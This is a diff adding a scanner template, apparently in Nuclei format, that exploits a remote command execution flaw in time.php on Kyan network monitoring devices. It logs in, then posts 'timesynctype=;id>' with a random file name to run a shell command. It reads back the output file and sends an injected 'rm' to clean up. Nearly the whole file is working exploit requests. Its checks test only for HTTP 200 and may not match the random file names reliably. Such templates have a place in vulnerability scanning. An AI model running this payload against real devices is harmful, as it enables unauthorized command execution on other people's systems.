@@ -1,0 +1,77 @@
+id: poc-yaml-kyan-time-rce
+
+info:
+  name: poc-yaml-kyan-time-rce
+  author: EASY(https://github.com/EASY233)
+  severity: critical
+  tags: xray-converted,rce,ct-517516
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Kyan%20%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87%20time.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+
+http:
+  - raw:
+      - |
+        GET /hosts HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID={{rand_base(8)}}
+
+        user={{username}}&passwd={{password}}&x=56&y=21
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /time.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID={{rand_base(8)}}
+
+        timesynctype=;id>{{rand_base(8)}}.txt
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /{{rand_base(8)}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID={{rand_base(8)}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /time.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID={{rand_base(8)}}
+
+        timesynctype=%3Brm%20{{rand_base(8)}}.txt
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
